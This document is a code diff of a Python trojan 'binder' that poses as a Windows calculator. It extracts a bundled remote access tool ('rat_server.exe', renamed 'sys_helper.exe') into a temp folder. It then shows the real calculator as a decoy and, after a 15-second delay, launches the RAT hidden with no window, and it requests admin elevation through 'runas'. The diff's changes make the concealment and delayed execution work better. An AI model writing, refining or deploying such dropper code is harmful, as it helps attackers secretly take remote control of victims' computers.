@@ -3,98 +3,100 @@ import os
 import tempfile
 import subprocess
 import ctypes
-import win32con
 import win32api
 import win32event
 import winerror
+import time
 
 
 def check_mutex():
-    """Atomic mutex check with proper error handling"""
+    """Ensure single instance using mutex"""
     mutex_name = "Global\\PyRatBinder"
+    mutex = None
     try:
         mutex = win32event.CreateMutex(None, True, mutex_name)
-        last_error = win32api.GetLastError()
-
-        # Both methods shown for reference
-        if last_error in (winerror.ERROR_ALREADY_EXISTS, 183):
-            ctypes.windll.user32.MessageBoxW(
-                0,
-                "Calculator is already running",
-                "System Alert",
-                0x40
-            )
+        if win32api.GetLastError() in (winerror.ERROR_ALREADY_EXISTS, 183):
+            ctypes.windll.user32.MessageBoxW(0, "Calculator is already running", "System Alert", 0x40)
             sys.exit(1)
     except Exception as e:
-        ctypes.windll.user32.MessageBoxW(
-            0,
-            f"Failed to initialize security: {str(e)}",
-            "Critical Error",
-            0x10
-        )
+        ctypes.windll.user32.MessageBoxW(0, f"Startup Error: {str(e)}", "Critical Error", 0x10)
         sys.exit(1)
     finally:
-        if 'mutex' in locals():
+        if mutex:
             win32api.CloseHandle(mutex)
 
+
 def main():
-    # Use proper temp directory
-    temp_dir = tempfile.gettempdir()
-
+    """Main execution with secure file handling"""
     try:
-        # Extract calculator with proper permissions
+        # Use custom temp directory
+        temp_dir = os.path.join(tempfile.gettempdir(), "CalculatorCache")
+        os.makedirs(temp_dir, exist_ok=True)
+
+        # Set file paths
         calc_path = os.path.join(temp_dir, "win_calc.exe")
-        with open(calc_path, 'wb') as f:
-            f.write(open(os.path.join(sys._MEIPASS, 'calc.exe'), 'rb').read())
-
-        # Extract RAT server
         rat_path = os.path.join(temp_dir, "sys_helper.exe")
-        with open(rat_path, 'wb') as f:
-            f.write(open(os.path.join(sys._MEIPASS, 'rat_server.exe'), 'rb').read())
 
-        # Start processes
-        calc_proc = subprocess.Popen([calc_path],
-                                     creationflags=subprocess.CREATE_NO_WINDOW)
-        rat_proc = subprocess.Popen([rat_path],
-                                    creationflags=subprocess.SW_HIDE | subprocess.CREATE_NO_WINDOW,
-                                    stdin=subprocess.DEVNULL,
-                                    stdout=subprocess.DEVNULL,
-                                    stderr=subprocess.DEVNULL)
+        # Extract files with explicit permissions
+        with open(os.path.join(sys._MEIPASS, 'calc.exe'), 'rb') as src, open(calc_path, 'wb') as dest:
+            dest.write(src.read())
+        os.chmod(calc_path, 0o777)
 
-        # Immediately exit after spawning
+        with open(os.path.join(sys._MEIPASS, 'rat_server.exe'), 'rb') as src, open(rat_path, 'wb') as dest:
+            dest.write(src.read())
+        os.chmod(rat_path, 0o777)
+
+        # Prepare environment
+        env = os.environ.copy()
+        if hasattr(sys, '_MEIPASS'):  # Add DLL directory to PATH
+            env['PATH'] = f"{sys._MEIPASS};{env['PATH']}"
+
+        # Start Calculator
+        subprocess.Popen([calc_path],
+                         creationflags=subprocess.CREATE_NO_WINDOW,
+                         env=env)
+
+        # Delayed RAT execution
+        time.sleep(15)
+        subprocess.Popen([rat_path],
+                         creationflags=subprocess.SW_HIDE | subprocess.CREATE_NO_WINDOW,
+                         stdin=subprocess.DEVNULL,
+                         stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL,
+                         env=env)
         sys.exit(0)
 
     except Exception as e:
-        print(f"Error: {str(e)}")
+        ctypes.windll.user32.MessageBoxW(0, f"Error: {str(e)}", "Failure", 0x10)
         sys.exit(1)
 
 
 def elevate():
-    """Admin elevation with DLL workaround"""
-    if sys.platform == 'win32':
-        if ctypes.windll.shell32.IsUserAnAdmin():
-            return
+    """Admin elevation with proper argument passing"""
+    if sys.platform != 'win32':  # Restore platform check
+        return
 
-        # Only pass --dll-dir if _MEIPASS exists
-        meipass = getattr(sys, '_MEIPASS', '')
-        args = [sys.argv[0]]
-        if meipass:
-            args.extend(['--dll-dir', meipass])
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return
 
-        ctypes.windll.shell32.ShellExecuteW(
-            None,
-            "runas",
-            sys.executable,
-            ' '.join(f'"{arg}"' for arg in args),
-            None,
-            1
-        )
-        sys.exit(0)
+    args = [sys.argv[0]]
+    if hasattr(sys, '_MEIPASS'):
+        args.extend(['--dll-dir', sys._MEIPASS])
+
+    ctypes.windll.shell32.ShellExecuteW(
+        None,
+        "runas",
+        sys.executable,
+        ' '.join(f'"{arg}"' for arg in args),
+        None,
+        1
+    )
+    sys.exit(0)
 
 
 if __name__ == "__main__":
     check_mutex()
-    if '--dll-dir' in sys.argv:
+    if '--dll-dir' in sys.argv:  # Restore PATH handling
         dll_dir = sys.argv[sys.argv.index('--dll-dir') + 1]
         os.environ['PATH'] = f"{dll_dir};{os.environ['PATH']}"
     elevate()
